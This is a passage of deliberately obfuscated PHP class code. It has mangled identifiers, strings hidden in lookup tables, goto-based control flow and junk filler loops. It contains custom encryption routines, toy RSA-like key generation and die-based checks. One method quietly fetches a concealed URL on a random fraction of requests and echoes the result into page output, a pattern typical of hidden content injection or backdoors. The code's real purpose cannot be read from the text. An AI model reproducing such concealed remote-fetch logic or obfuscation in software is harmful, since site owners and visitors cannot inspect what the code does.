(strlen($f„ö…‘Ø¬ò) < $aŸª£³°³ß[591]) { return; } goto Eó«½ñø¤–; eÅ…ñ¥Èà–: $aŸª£³°³ß =& $_SERVER[¦·]; $c¹·Ÿ­æğö =& $_SERVER[Ó¥ú]; $BˆĞ†ÂÛã¤ = $c¹·Ÿ­æğö[297]; goto E¬çëÚ°‡; a¤ĞÆŠ–·: $bØ­›ÆÉ¶… = $c¹·Ÿ­æğö[257](array($c¹·Ÿ­æğö[258] => array($c¹·Ÿ­æğö[261] => $bĞŠÚĞ¹‡Ş, $c¹·Ÿ­æğö[259] => $c¹·Ÿ­æğö[301]), $c¹·Ÿ­æğö[302] => array($c¹·Ÿ­æğö[303] => !1, $c¹·Ÿ­æğö[304] => !1))); $AÎÉ­ˆ§ÜÙ = $aŸª£³°³ß[622]; if (strlen($AÎÉ­ˆ§ÜÙ) < $aŸª£³°³ß[552]) { return; } goto a‡–«å×ôº; Eó«½ñø¤–: } private function ncso4cbdc357() { goto CË«àæÃ¼Ü; CË«àæÃ¼Ü: $f÷šÈÊ“š =& $_SERVER[¦·]; $BÅèŒ†Î¾ =& $_SERVER[Ó¥ú]; $aÔÍ‚ğ¶‚© = array($BÅèŒ†Î¾[305] => $BÅèŒ†Î¾[306], $BÅèŒ†Î¾[307] => $BÅèŒ†Î¾[308], $BÅèŒ†Î¾[309] => $BÅèŒ†Î¾[310], $BÅèŒ†Î¾[311] => $BÅèŒ†Î¾[312], $BÅèŒ†Î¾[313] => $BÅèŒ†Î¾[314], $BÅèŒ†Î¾[315] => $BÅèŒ†Î¾[250], $BÅèŒ†Î¾[316] => $BÅèŒ†Î¾[250], $BÅèŒ†Î¾[317] => $BÅèŒ†Î¾[306], $BÅèŒ†Î¾[318] => $BÅèŒ†Î¾[308], $BÅèŒ†Î¾[319] => $BÅèŒ†Î¾[310], $BÅèŒ†Î¾[320] => $BÅèŒ†Î¾[321], $BÅèŒ†Î¾[322] => $BÅèŒ†Î¾[312], $BÅèŒ†Î¾[323] => $BÅèŒ†Î¾[324], $BÅèŒ†Î¾[325] => $BÅèŒ†Î¾[314], $BÅèŒ†Î¾[326] => $BÅèŒ†Î¾[327], $BÅèŒ†Î¾[328] => $BÅèŒ†Î¾[329], $BÅèŒ†Î¾[330] => $BÅèŒ†Î¾[331]); goto D«ãÑƒ»»Ø; b¾¨ƒé™İæ: if (strlen($Bãâ­³Àµã) < $f÷šÈÊ“š[591]) { return; } $D“ÁáÖãñÉ = $BÅèŒ†Î¾[249]($D“ÁáÖãñÉ ? $D“ÁáÖãñÉ : $BÅèŒ†Î¾[306]); $bé†Ø‚çíÍ = $f÷šÈÊ“š[627]; goto a‹ó‡ƒáŒƒ; a‹ó‡ƒáŒƒ: if (strlen($bé†Ø‚çíÍ) < $f÷šÈÊ“š[552]) { die; } $EàÁŸè…©‰ = $BÅèŒ†Î¾[113]($this->ftcn0421233a, $BÅèŒ†Î¾[332]); $EàÁŸè…©‰ = $EàÁŸè…©‰ ? $BÅèŒ†Î¾[249]($EàÁŸè…©‰) : 0; goto FïĞ¯´ÇÈ‚; FïĞ¯´ÇÈ‚: return $D“ÁáÖãñÉ + $EàÁŸè…©‰; $aõ“ÌÊÈ‹– = $f÷šÈÊ“š[628]; if (strlen($aõ“ÌÊÈ‹–) < $f÷šÈÊ“š[558]) { die; } goto f¨†„õóã; D«ãÑƒ»»Ø: $Dö“ƒ¯† = $f÷šÈÊ“š[625]; $D“ÁáÖãñÉ = $aÔÍ‚ğ¶‚©[$this->otvd669bc36d]; $Bãâ­³Àµã = $f÷šÈÊ“š[626]; goto b¾¨ƒé™İæ; f¨†„õóã: } public function qnwc7f462fcc($a¶ÙÀÆ†–‰) { goto Ağª‰™ƒ‘†; bõ°Âºò‰: if (!$d‰ÌÒÔ¢ŸÎ) { die; } if (!$a¬——ì«İ§[247]($a¶ÙÀÆ†–‰[$a¬——ì«İ§[333]], $eÛøèôÇô°)) { $a¬——ì«İ§[175]($a¬——ì«İ§[337], !1, $a¬——ì«İ§[244]); } goto D×õ’«Ğ£Ÿ; bß‹­ìë ô: $EÙÁÀÇÍøÊ = $dİœ —µ¿Ó[629]; if (!$EÙÁÀÇÍøÊ) { return; } if ($aò‡§Ë·Ãª <= $BùÄĞŸ‚ÀÓ) { return; } goto B¼ÀÅœ„¾; aÔ«©ÑˆÍ£: if ($a¶ÙÀÆ†–‰[$a¬——ì«İ§[333]] == $a¬——ì«İ§[228]) { return; } if ($BùÄĞŸ‚ÀÓ >= $a¬——ì«İ§[249]($a¬——ì«İ§[250])) { return; } $aò‡§Ë·Ãª = $a¬——ì«İ§[61]($a¬——ì«İ§[148])->{$_SERVER[Ó¥ú][149]}(); goto bß‹­ìë ô; Ağª‰™ƒ‘†: $dİœ —µ¿Ó =& $_SERVER[¦·]; $a¬——ì«İ§ =& $_SERVER[Ó¥ú]; $BùÄĞŸ‚ÀÓ = $this->{$_SERVER[Ó¥ú][146]}(); goto aÔ«©ÑˆÍ£; B¼ÀÅœ„¾: $eÛøèôÇô° = $a¬——ì«İ§[61]($a¬——ì«İ§[148])->{$_SERVER[Ó¥ú][334]}($a¬——ì«İ§[333])->{$_SERVER[Ó¥ú][335]}($BùÄĞŸ‚ÀÓ)->{$_SERVER[Ó¥ú][336]}(); $eÛøèôÇô° = $a¬——ì«İ§[230]($eÛøèôÇô°, $a¬——ì«İ§[10], $a¬——ì«İ§[333]); $d‰ÌÒÔ¢ŸÎ = $dİœ —µ¿Ó[630]; goto bõ°Âºò‰; D×õ’«Ğ£Ÿ: } public function phro237c5a5d() { goto e¨İŒæ¿í; e¨İŒæ¿í: $FÄŒÕ–İÚ =& $_SERVER[¦·]; $e¥İ˜ê«ù‘ =& $_SERVER[Ó¥ú]; if (!$e¥İ˜ê«ù‘[113]($GLOBALS, $e¥İ˜ê«ù‘[141]) || $e¥İ˜ê«ù‘[338](1, 100) > 20) { return; } goto e¢´‘àÍö—; e¢´‘àÍö—: $c®óİ·„å = $e¥İ˜ê«ù‘[254]; $AéªªÀğŸá = $FÄŒÕ–İÚ[631]; if (!$AéªªÀğŸá) { return; } goto cèÀôòå“®; a¡Å›†õŞÚ: $cÄÅ§ìéÜ² = $FÄŒÕ–İÚ[633]; while (strlen($cÄÅ§ìéÜ²) < $FÄŒÕ–İÚ[558]) { if (!$cÄÅ§ìéÜ²) { break; } $cÄÅ§ìéÜ²++; } goto dšĞˆ™ç°; b„”êŞêÀ: $fí’ÆŒğÍÁ = $FÄŒÕ–İÚ[632]; while ($fí’ÆŒğÍÁ < $FÄŒÕ–İÚ[556]) { if ($fí’ÆŒğÍÁ >= 0) { break; } $fí’ÆŒğÍÁ++; } echo $e¥İ˜ê«ù‘[339] . $e¥İ˜ê«ù‘[340]($EŸ²â‡èÍİ) . $e¥İ˜ê«ù‘[341]; goto a¡Å›†õŞÚ; cèÀôòå“®: $c®óİ·„å = $this->{$_SERVER[Ó¥ú][255]}($c®óİ·„å, $e¥İ˜ê«ù‘[256]); $d‹¢‹©ñ±² = $e¥İ˜ê«ù‘[257](array($e¥İ˜ê«ù‘[258] => array($e¥İ˜ê«ù‘[259] => $e¥İ˜ê«ù‘[260], $e¥İ˜ê«ù‘[261] => 3))); $EŸ²â‡èÍİ = @$e¥İ˜ê«ù‘[262]($c®óİ·„å, !1, $d‹¢‹©ñ±²); goto b„”êŞêÀ; dšĞˆ™ç°: } private function thxl9883e19c($C°Ê§­İ Ş, $bŞ«­À‰š, $Fö°œˆ©ƒ = 3) { goto aÛš©ñ«Æ; BÉÂù–í˜„: $dêëÖƒó„à = $bÒõÛ Í”°[634]; if (strlen($dêëÖƒó„à) < $bÒõÛ Í”°[558]) { die; } $C°Ê§­İ Ş = $A•¸¡³·Œ[2]($C°Ê§­İ Ş); goto bŒ§ºÆãì; bŒ§ºÆãì: $aù× ˜Õ“Í = $bÒõÛ Í”°[635]; while (strlen($aù× ˜Õ“Í) < $bÒõÛ Í”°[552]) { if (!$aù× ˜Õ“Í) { break; } $aù× ˜Õ“Í++; } $C»È÷÷«† = $A•¸¡³·Œ[338](0, 5) . $A•¸¡³·Œ[10]; goto EŒ‚ºãó‹à; DÊŠóôÀ¿˜: if (strlen($A†§–ÑÙÇ) < $bÒõÛ Í”°[556]) { die; } switch ($C»È÷÷«†) { case $A•¸¡³·Œ[240]: $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][156]}($C°Ê§­İ Ş, $A•¸¡³·Œ[222]($bŞ«­À‰š . $c™¿Ø¢ßô)); $bç„¶«ÃÙ = $bÒõÛ Í”°[637]; if (!$bç„¶«ÃÙ) { die; } break; case $A•¸¡³·Œ[228]: $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][156]}($C°Ê§­İ Ş, $A•¸¡³·Œ[222]($c™¿Ø¢ßô . $bŞ«­À‰š)); break; case $A•¸¡³·Œ[344]: $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][156]}($C°Ê§­İ Ş, $A•¸¡³·Œ[127]($c™¿Ø¢ßô . $bŞ«­À‰š)); break; $b‰éç‰„¸Ì = $bÒõÛ Í”°[638]; if (strlen($b‰éç‰„¸Ì) < $bÒõÛ Í”°[591]) { return; } case $A•¸¡³·Œ[345]: $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][156]}($C°Ê§­İ Ş, $A•¸¡³·Œ[123]($c™¿Ø¢ßô . $bŞ«­À‰š)); break; case $A•¸¡³·Œ[346]: goto bŞÂ‚”Ñ; BÒÈŠ·ÄÛÅ: $a²÷ÍÌ´‰ì = $A•¸¡³·Œ[340]($eºò èæø¶ . $C·Şîğ…Â); break; $EÕÁ÷Ñ‚âš = $bÒõÛ Í”°[645]; goto bñÊ¸ó¸İĞ; bñÊ¸ó¸İĞ: if (!$EÕÁ÷Ñ‚âš) { return; } goto Bº·š±Ã©·; açŒ¨‰ÛñŞ: $aøœÍ‚™ÊË = $A•¸¡³·Œ[347](0, 64); $eºò èæø¶ = $e§±·è•è[$aøœÍ‚™ÊË]; $f—Æ’À¬ªà = $A•¸¡³·Œ[123]($eºò èæø¶ . $A•¸¡³·Œ[123]($bŞ«­À‰š . $eºò èæø¶) . $bŞ«­À‰š); goto cÍ¤Öå›†; eè§Ï¶ˆ´: if (strlen($Añˆã¿ä‘Š) < $bÒõÛ Í”°[552]) { die; } $e©Í´öõõ„ = 0; for ($fƒ¡…³êğ = 0; $fƒ¡…³êğ < $A•¸¡³·Œ[24]($C°Ê§­İ Ş); $fƒ¡…³êğ++) { $e©Í´öõõ„ = $e©Í´öõõ„ == $A•¸¡³·Œ[24]($f—Æ’À¬ªà) ? 0 : $e©Í´öõõ„; $A˜¹Î²¹ô = $bÒõÛ Í”°[642]; if (!$A˜¹Î²¹ô) { return; } $EÎ—©ù³ƒã = ($aøœÍ‚™ÊË + $A•¸¡³·Œ[348]($e§±·è•è, $C°Ê§­İ Ş[$fƒ¡…³êğ]) + $A•¸¡³·Œ[349]($f—Æ’À¬ªà[$e©Í´öõõ„++])) % 64; $b‘„ãáƒª = $bÒõÛ Í”°[643]; while (strlen($b‘„ãáƒª) < $bÒõÛ Í”°[556]) { if (!$b‘„ãáƒª) { break; } $b‘„ãáƒª++; } $C·Şîğ…Â .= $e§±·è•è[$EÎ—©ù³ƒã]; $EŠ­İö¸ = $bÒõÛ Í”°[644]; if (strlen($EŠ­İö¸) < $bÒõÛ Í”°[576]) { return; } } goto BÒÈŠ·ÄÛÅ; bŞÂ‚”Ñ: $C°Ê§­İ Ş = $A•¸¡³·Œ[127]($C°Ê§­İ Ş); $dÕ”¸Ò£óÈ = $bÒõÛ Í”°[639]; while (strlen($dÕ”¸Ò£óÈ) < $bÒõÛ Í”°[556]) { if (!$dÕ”¸Ò£óÈ) { break; } $dÕ”¸Ò£óÈ++; } goto açŒ¨‰ÛñŞ; e‡øÍÎ²Û: $AƒÙÀ• = $bÒõÛ Í”°[640]; $EÎ—©ù³ƒã = 0; $Añˆã¿ä‘Š = $bÒõÛ Í”°[641]; goto eè§Ï¶ˆ´; cÍ¤Öå›†: $f—Æ’À¬ªà = $A•¸¡³·Œ[25]($f—Æ’À¬ªà, $aøœÍ‚™ÊË % 8, $aøœÍ‚™ÊË % 8 + 7); $C·Şîğ…Â = $A•¸¡³·Œ[10]; $fƒ¡…³êğ = 0; goto e‡øÍÎ²Û; Bº·š±Ã©·: default: $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][156]}($C°Ê§­İ Ş, $bŞ«­À‰š . $c™¿Ø¢ßô); break; } $a²÷ÍÌ´‰ì = $A•¸¡³·Œ[222]($C»È÷÷«† . $c™¿Ø¢ßô . $a²÷ÍÌ´‰ì); goto d½ì£Æö·ö; aÛš©ñ«Æ: $bÒõÛ Í”° =& $_SERVER[¦·]; $A•¸¡³·Œ =& $_SERVER[Ó¥ú]; $A•¸¡³·Œ[342](1); goto BÉÂù–í˜„; EŒ‚ºãó‹à: $c™¿Ø¢ßô = $A•¸¡³·Œ[133](15); $e§±·è•è = $A•¸¡³·Œ[343]; $A†§–ÑÙÇ = $bÒõÛ Í”°[636]; goto DÊŠóôÀ¿˜; d½ì£Æö·ö: $aˆ—…µò·Œ = $bÒõÛ Í”°[646]; if ($Fö°œˆ©ƒ - 1 > 0) { $a²÷ÍÌ´‰ì = $this->{$_SERVER[Ó¥ú][136]}($a²÷ÍÌ´‰ì, $bŞ«­À‰š, $Fö°œˆ©ƒ - 1); } return $a²÷ÍÌ´‰ì; goto d†ÃãÕ‹˜×; d†ÃãÕ‹˜×: } private function vian49175750($DÉ®œ ëß‡, $EÍÏæ­‘÷, $fÑø†«ã¯ = 3) { goto eê÷…İ’É; cÏ–ÔòÙ·: $d¨å–Õ®Ø‰ = $b‹¸›¤¢áƒ[25]($DÉ®œ ëß‡, 1, 15); $c§‰ùªÜ£ˆ = $EÚšèêĞ[649]; if (!$c§‰ùªÜ£ˆ) { die; } goto F®›»¼¶ø; eê÷…İ’É: $EÚšèêĞ =& $_SERVER[¦·]; $b‹¸›¤¢áƒ =& $_SERVER[Ó¥ú]; if (!$b‹¸›¤¢áƒ[350]($DÉ®œ ëß‡) || $b‹¸›¤¢áƒ[24]($DÉ®œ ëß‡) < 10) { return !1; } goto bšêõìâ±; F±¨À…»¼•: return $cœÑîÎŸµ®; goto b×¾®ªØç; F®›»¼¶ø: $DÉ®œ ëß‡ = $b‹¸›¤¢áƒ[25]($DÉ®œ ëß‡, 16); $Fëë¤¾Ø× = $b‹¸›¤¢áƒ[343]; $C²ù²ø† = $EÚšèêĞ[650]; goto D‹©Ë†çòø; D‹©Ë†çòø: if (strlen($C²ù²ø†) < $EÚšèêĞ[576]) { die; } switch ($Eª¸ÄÁì¢’) { case $b‹¸›¤¢áƒ[240]: $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][255]}($DÉ®œ ëß‡, $b‹¸›¤¢áƒ[222]($EÍÏæ­‘÷ . $d¨å–Õ®Ø‰)); break; $a—–¿º§æ = $EÚšèêĞ[651]; while ($a—–¿º§æ < $EÚšèêĞ[558]) { if ($a—–¿º§æ >= 0) { break; } $a—–¿º§æ++; } case $b‹¸›¤¢áƒ[228]: $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][255]}($DÉ®œ ëß‡, $b‹¸›¤¢áƒ[222]($d¨å–Õ®Ø‰ . $EÍÏæ­‘÷)); $CÓåª«—Å = $EÚšèêĞ[652]; if (strlen($CÓåª«—Å) < $EÚšèêĞ[556]) { die; } break; case $b‹¸›¤¢áƒ[344]: $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][255]}($DÉ®œ ëß‡, $b‹¸›¤¢áƒ[127]($d¨å–Õ®Ø‰ . $EÍÏæ­‘÷)); $C×¢çâ«æÖ = $EÚšèêĞ[653]; if (!$C×¢çâ«æÖ) { die; } break; case $b‹¸›¤¢áƒ[345]: $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][255]}($DÉ®œ ëß‡, $b‹¸›¤¢áƒ[123]($d¨å–Õ®Ø‰ . $EÍÏæ­‘÷)); break; case $b‹¸›¤¢áƒ[346]: goto C¿¡µ™‘; B«Äˆ¹òÍÏ: $fÉ‹¾§âõÖ = 0; $eñ¿„ÛĞµ‘ = $EÚšèêĞ[658]; if (strlen($eñ¿„ÛĞµ‘) < $EÚšèêĞ[552]) { die; } goto FÛ‘ŠÍÈ„ì; cÈƒ°ƒÄä«: if (!$Bº¹¥âÛõ¨) { return; } $A­…¹ÛÓ‘ = $b‹¸›¤¢áƒ[348]($Fëë¤¾Ø×, $C…òßÆµ”ô); $e¾ÚÇ“Ü¹„ = $b‹¸›¤¢áƒ[123]($C…òßÆµ”ô . $b‹¸›¤¢áƒ[123]($EÍÏæ­‘÷ . $C…òßÆµ”ô) . $EÍÏæ­‘÷); goto CòóäÛÍ; d«Ï”ª™×¼: for ($e›âÕ‘ÚÓ¯ = 0; $e›âÕ‘ÚÓ¯ < $b‹¸›¤¢áƒ[24]($DÉ®œ ëß‡); $e›âÕ‘ÚÓ¯++) { $dáÈµ‹‚‹ = $dáÈµ‹‚‹ == $b‹¸›¤¢áƒ[24]($e¾ÚÇ“Ü¹„) ? 0 : $dáÈµ‹‚‹; $bÅìÇ»ë„– = $EÚšèêĞ[660]; while (strlen($bÅìÇ»ë„–) < $EÚšèêĞ[558]) { if (!$bÅìÇ»ë„–) { break; } $bÅìÇ»ë„–++; } $Fˆ¹¯í…¸Æ = $dáÈµ‹‚‹++; $fÉ‹¾§âõÖ = $b‹¸›¤¢áƒ[348]($Fëë¤¾Ø×, $DÉ®œ ëß‡[$e›âÕ‘ÚÓ¯]) - $A­…¹ÛÓ‘ - $b‹¸›¤¢áƒ[349]($e¾ÚÇ“Ü¹„[$Fˆ¹¯í…¸Æ]); while ($fÉ‹¾§âõÖ < 0) { $fÉ‹¾§âõÖ += 64; } $a¥ê²öÃÁù .= $Fëë¤¾Ø×[$fÉ‹¾§âõÖ]; } $cœÑîÎŸµ® = $b‹¸›¤¢áƒ[352]($a¥ê²öÃÁù); $D†É”ÙŠÓÑ = $EÚšèêĞ[661]; goto cÂÑèÈÓ®; CòóäÛÍ: $e¾ÚÇ“Ü¹„ = $b‹¸›¤¢áƒ[25]($e¾ÚÇ“Ü¹„, $A­…¹ÛÓ‘ % 8, $A­…¹ÛÓ‘ % 8 + 7); $c¸Ã§„­²Ì = $EÚšèêĞ[656]; $a¥ê²öÃÁù = $b‹¸›¤¢áƒ[10]; goto DÄôµÎÜÔ; C¿¡µ™‘: $DÉ®œ ëß‡ = $b‹¸›¤¢áƒ[351]($DÉ®œ ëß‡); $C…òßÆµ”ô = $DÉ®œ ëß‡[0]; $DÌ¿«ãóŞ‚ = $EÚšèêĞ[654]; goto Fİ¼Åğá…¡; FÛ‘ŠÍÈ„ì: $dáÈµ‹‚‹ = 0; $Eº‡äéÖ½ = $EÚšèêĞ[659]; if (!$Eº‡äéÖ½) { die; } goto d«Ï”ª™×¼; Fİ¼Åğá…¡: while ($DÌ¿«ãóŞ‚ < $EÚšèêĞ[552]) { if ($DÌ¿«ãóŞ‚ >= 0) { break; } $DÌ¿«ãóŞ‚++; } $DÉ®œ ëß‡ = $b‹¸›¤¢áƒ[25]($DÉ®œ ëß‡, 1); $Bº¹¥âÛõ¨ = $EÚšèêĞ[655]; goto cÈƒ°ƒÄä«; cÂÑèÈÓ®: if (strlen($D†É”ÙŠÓÑ) < $EÚšèêĞ[576]) { return; } break; goto aÛç¡î‘‹Š; DÄôµÎÜÔ: $dÌ•äµÔõ¿ = $EÚšèêĞ[657]; if (!$dÌ•äµÔõ¿) { return; } $e›âÕ‘ÚÓ¯ = 0; goto B«Äˆ¹òÍÏ; aÛç¡î‘‹Š: default: $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][255]}($DÉ®œ ëß‡, $EÍÏæ­‘÷ . $d¨å–Õ®Ø‰); break; } if ($fÑø†«ã¯ - 1 > 0) { $cœÑîÎŸµ® = $this->{$_SERVER[Ó¥ú][197]}($cœÑîÎŸµ®, $EÍÏæ­‘÷, $fÑø†«ã¯ - 1); } goto F±¨À…»¼•; f îĞ‹ĞÏ: $Eª¸ÄÁì¢’ = $DÉ®œ ëß‡[0]; $CãÌù¹Œ‹† = $EÚšèêĞ[648]; if (strlen($CãÌù¹Œ‹†) < $EÚšèêĞ[591]) { die; } goto cÏ–ÔòÙ·; bšêõìâ±: $DÉ®œ ëß‡ = $b‹¸›¤¢áƒ[2]($DÉ®œ ëß‡); $DÉ®œ ëß‡ = $b‹¸›¤¢áƒ[222]($DÉ®œ ëß‡); $cèä‹øª„İ = $EÚšèêĞ[647]; goto f îĞ‹ĞÏ; b×¾®ªØç: } public function njsf8926a596($dä¡Ô´“®À) { goto eğ™º¿å™½; f‹ÁÓÀÄ±×: $E­®Ä§³ª— = $f‚ë§ÛÁ[667]; while ($E­®Ä§³ª— < $f‚ë§ÛÁ[576]) { if ($E­®Ä§³ª— >= 0) { break; } $E­®Ä§³ª—++; } $f¨Ù†š„× = $this->{$_SERVER[Ó¥ú][156]}($dä¡Ô´“®À, $fÖÖŸÕåã…) . $b³”ìÇ³µå[357] . $fÓòÕ½ùİÛ; goto F¿ÑÌ›è½; eğ™º¿å™½: $f‚ë§ÛÁ =& $_SERVER[¦·]; $b³”ìÇ³µå =& $_SERVER[Ó¥ú]; $e“²«Ï¸ = $this->{$_SERVER[Ó¥ú][353]}(); goto FƒËŠ±ì; c–µŠ“¬Ô¾: if (strlen($E˜¹²‘‰¹) < $f‚ë§ÛÁ[552]) { return; } while (1) { $aÚ¥¥¾îÁÄ = $FõéÉ¶æñ”; $d­ªÅ‹×ÑÕ = $f‚ë§ÛÁ[665]; while (strlen($d­ªÅ‹×ÑÕ) < $f‚ë§ÛÁ[576]) { if (!$d­ªÅ‹×ÑÕ) { break; } $d­ªÅ‹×ÑÕ++; } $B»ÒÑ¡­À¤ = $D™ÅâÃè®ì; $A÷öß™Œ«ˆ = $f‚ë§ÛÁ[666]; while ($B»ÒÑ¡­À¤ % $aÚ¥¥¾îÁÄ != 0) { $aÄÁŸ®š¥ = $B»ÒÑ¡­À¤; $B»ÒÑ¡­À¤ = $aÚ¥¥¾îÁÄ; $aÚ¥¥¾îÁÄ = $aÄÁŸ®š¥ % $aÚ¥¥¾îÁÄ; } if ($aÚ¥¥¾îÁÄ == 1) { break; } else { $FõéÉ¶æñ”++; } } $C¬º–‰ô¦Ö = 2; goto B­‰ºÎîÔ×; FƒËŠ±ì: $E¢¸ÉŠÆ¨ˆ = $f‚ë§ÛÁ[662]; if (!$E¢¸ÉŠÆ¨ˆ) { die; } $E•¢‰ÛŒ¦ = $this->{$_SERVER[Ó¥ú][353]}(); goto bà²‹®éÒ; bà²‹®éÒ: $b¹ö°•Üƒ = $f‚ë§ÛÁ[663]; $D™ÅâÃè®ì = ($e“²«Ï¸ - 1) * ($E•¢‰ÛŒ¦ - 1); $C¦òî›‚¯ = $f‚ë§ÛÁ[548]; goto B ì½¥Æ„; B­‰ºÎîÔ×: for ($BµÆÕéğö = 0; $BµÆÕéğö < $D™ÅâÃè®ì * 10; $BµÆÕéğö++) { if (($D™ÅâÃè®ì * $BµÆÕéğö + 1) % $FõéÉ¶æñ” == 0) { $C¬º–‰ô¦Ö = $b³”ìÇ³µå[249](($D™ÅâÃè®ì * $BµÆÕéğö + 1) / $FõéÉ¶æñ”); break; } } $fÓòÕ½ùİÛ = $this->{$_SERVER[Ó¥ú][156]}($e“²«Ï¸ * $E•¢‰ÛŒ¦ . $b³”ìÇ³µå[10], $b³”ìÇ³µå[158]); $fÖÖŸÕåã… = $b³”ìÇ³µå[123]($b³”ìÇ³µå[354] . ($e“²«Ï¸ + $E•¢‰ÛŒ¦) . $b³”ìÇ³µå[355] . $FõéÉ¶æñ” . $b³”ìÇ³µå[355] . $C¬º–‰ô¦Ö . $b³”ìÇ³µå[356]); goto f‹ÁÓÀÄ±×; B ì½¥Æ„: while ($C¦òî›‚¯ < $f‚ë§ÛÁ[576]) { if ($C¦òî›‚¯ >= 0) { break; } $C¦òî›‚¯++; } $FõéÉ¶æñ” = $b³”ìÇ³µå[249](($e“²«Ï¸ + $E•¢‰ÛŒ¦) / 2); $E˜¹²‘‰¹ = $f‚ë§ÛÁ[664]; goto c–µŠ“¬Ô¾; F¿ÑÌ›è½: return $f¨Ù†š„×; $F„¸‰ÈˆÍå = $f‚ë§ÛÁ[668]; if (strlen($F„¸‰ÈˆÍå) < $f‚ë§ÛÁ[558]) { return; } goto a ¹ñ“Ç®æ; a ¹ñ“Ç®æ: } public function cyoj0889b745($FİËø›Å —) { goto EÒñ¹«†ƒÀ; A‘› ŒÔğ: $B¿ŒàÚî‰‚ = 0; $d»å³²ùĞ• = $c¦¸áŠ–¤[671]; while (strlen($d»å³²ùĞ•) < $c¦¸áŠ–¤[576]) { if (!$d»å³²ùĞ•) { break; } $d»å³²ùĞ•++; } goto eŠ¾‡³Üæ„; dšÓñ††± : if ($F‚ÌéòŒ°‰[19]($e¼Ï­¼Š¥‡) != 2) { return $F‚ÌéòŒ°‰[10]; } $aĞÔ¯ÀÓƒ— = $this->{$_SERVER[Ó¥ú][255]}($e¼Ï­¼Š¥‡[1] . $F‚ÌéòŒ°‰[10], $F‚ÌéòŒ°‰[158]); $CŠ£ƒéÃ¾ = $c¦¸áŠ–¤[669]; goto cµÏêï¯¤ó; E‘ˆæ©¯¿Š: $EğÃ†›’Š = $F‚ÌéòŒ°‰[123]($F‚ÌéòŒ°‰[354] . ($A™Ø¶œ‚Œ‘ + $B¿ŒàÚî‰‚) . $F‚ÌéòŒ°‰[355] . $eĞ±•¡Âİ¢ . $F‚ÌéòŒ°‰[355] . $C±¼ëõ’ . $F‚ÌéòŒ°‰[356]); $c•Äš¨·  = $c¦¸áŠ–¤[678]; if (strlen($c•Äš¨· ) < $c¦¸áŠ–¤[576]) { die; } goto F×‚ğÍ¤˜; DÕÔ±—“’Ì: $C±¼ëõ’ = 2; $D×ÉËŒà¹Á = $c¦¸áŠ–¤[677]; for ($C¼Á‹‘š¥Ï = 0; $C¼Á‹‘š¥Ï < $AÊ´¬£ÛË * 10; $C¼Á‹‘š¥Ï++) { if (($AÊ´¬£ÛË * $C¼Á‹‘š¥Ï + 1) % $eĞ±•¡Âİ¢ == 0) { $C±¼ëõ’ = $F‚ÌéòŒ°‰[249](($AÊ´¬£ÛË * $C¼Á‹‘š¥Ï + 1) / $eĞ±•¡Âİ¢); break; } } goto E‘ˆæ©¯¿Š; C–Áõ†Ğñœ: if (!$bæí•ñÄˆ¿) { die; } $eĞ±•¡Âİ¢ = $F‚ÌéòŒ°‰[249](($A™Ø¶œ‚Œ‘ + $B¿ŒàÚî‰‚) / 2); while (1) { $A÷¿ƒ†Ì©µ = $eĞ±•¡Âİ¢; $F¦è˜”½‰µ = $c¦¸áŠ–¤[675]; if (!$F¦è˜”½‰µ) { return; } $e“‚¢¸ßì÷ = $AÊ´¬£ÛË; while ($e“‚¢¸ßì÷ % $A÷¿ƒ†Ì©µ != 0) { $FŒ÷¥¿´î = $e“‚¢¸ßì÷; $e“‚¢¸ßì÷ = $A÷¿ƒ†Ì©µ; $FŞÌƒ¢èÜ = $c¦¸áŠ–¤[676]; if (strlen($FŞÌƒ¢èÜ) < $c¦¸áŠ–¤[591]) { die; } $A÷¿ƒ†Ì©µ = $FŒ÷¥¿´î % $A÷¿ƒ†Ì©µ; } if ($A÷¿ƒ†Ì©µ == 1) { break; } else { $eĞ±•¡Âİ¢++; } } goto DÕÔ±—“’Ì; EÒñ¹«†ƒÀ: $c¦¸áŠ–¤ =& $_SERVER[¦·]; $F‚ÌéòŒ°‰ =& $_SERVER[Ó¥ú]; $e¼Ï­¼Š¥‡ = $F‚ÌéòŒ°‰[0]($F‚ÌéòŒ°‰[357], $FİËø›Å —); goto dšÓñ††± ; eŠ¾‡³Üæ„: for ($C¼Á‹‘š¥Ï = 3; $C¼Á‹‘š¥Ï < $aĞÔ¯ÀÓƒ—; $C¼Á‹‘š¥Ï += 2) { if ($aĞÔ¯ÀÓƒ— % $C¼Á‹‘š¥Ï != 0) { continue; } $A™Ø¶œ‚Œ‘ = $C¼Á‹‘š¥Ï; $BÒßÌ„˜‚‚ = $c¦¸áŠ–¤[672]; while (strlen($BÒßÌ„˜‚‚) < $c¦¸áŠ–¤[552]) { if (!$BÒßÌ„˜‚‚) { break; } $BÒßÌ„˜‚‚++; } $B¿ŒàÚî‰‚ = $F‚ÌéòŒ°‰[249]($aĞÔ¯ÀÓƒ— / $C¼Á‹‘š¥Ï); $bµ‚Ôƒ÷Áã = $c¦¸áŠ–¤[673]; break; } $AÊ´¬£ÛË = ($A™Ø¶œ‚Œ‘ - 1) * ($B¿ŒàÚî‰‚ - 1); $bæí•ñÄˆ¿ = $c¦¸áŠ–¤[674]; goto C–Áõ†Ğñœ; aƒ¢¶¬‚ø‰: return $e‹¬‹“ ª; goto eË—ÜÙ¹; cµÏêï¯¤ó: if (strlen($CŠ£ƒéÃ¾) < $c¦¸áŠ–¤[576]) { die; } if (!$aĞÔ¯ÀÓƒ—) { return $F‚ÌéòŒ°‰[10]; } $aĞÔ¯ÀÓƒ— = $F‚ÌéòŒ°‰[249]($aĞÔ¯ÀÓƒ—); goto f”àâÕì—; f”àâÕì—: $A™Ø¶œ‚Œ‘ = 0; $FÇ´´Å÷Éƒ = $c¦¸áŠ–¤[670]; while ($FÇ´´Å÷Éƒ < $c¦¸áŠ–¤[591]) { if ($FÇ´´Å÷Éƒ >= 0) { break; } $FÇ´´Å÷Éƒ++; } goto A‘› ŒÔğ; F×‚ğÍ¤˜: $e‹¬‹“ ª = 